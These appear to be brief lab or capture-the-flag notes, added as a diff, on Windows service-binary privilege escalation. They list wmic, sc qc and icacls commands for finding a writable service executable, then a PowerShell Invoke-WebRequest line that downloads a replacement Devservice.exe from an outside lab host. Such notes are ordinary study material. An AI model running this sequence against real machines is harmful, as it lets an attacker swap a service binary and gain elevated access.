@@ -1,0 +1,17 @@
+methods
+
+check prog files
+
+a exe file was found then check which service execute that exe file
+
+wmic service get name,displayname,pathname,startmode | findstr Service.exe -- this command check
+
+get deatails of that service
+
+sc qc "Development Service" check for permissions
+
+icacls "C:\Program Files\Development Files\ "
+
+to dwld file
+
+powershell Invoke-WebRequest -Uri http://10.10.187.41:8000/Devservice.exe -Outfile Devservice.exe
